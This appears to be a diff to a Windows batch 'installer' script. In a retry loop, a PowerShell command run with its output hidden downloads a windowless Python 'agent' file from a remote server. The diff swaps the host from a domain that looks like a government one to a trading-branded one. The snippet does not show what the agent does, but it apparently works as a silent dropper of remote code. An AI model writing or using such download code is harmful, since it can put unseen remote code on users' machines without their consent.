@@ -155,7 +155,7 @@ echo Updating installer...
 set DL_OK_FLAG=0
 for /l %%t in (1,1,3) do (
     if !DL_OK_FLAG!==0 (
-        powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0'); $wc.DownloadFile('https://mt5cloud.esgov.org/api/agent-pyw', '%TARGET_DIR%\tradotcom_agent.pyw')" >nul 2>nul
+        powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0'); $wc.DownloadFile('https://tradotcom.com/api/agent-pyw', '%TARGET_DIR%\tradotcom_agent.pyw')" >nul 2>nul
         if exist "%TARGET_DIR%\tradotcom_agent.pyw" (
             for %%A in ("%TARGET_DIR%\tradotcom_agent.pyw") do if %%~zA GTR 10000 set DL_OK_FLAG=1
         ) else (
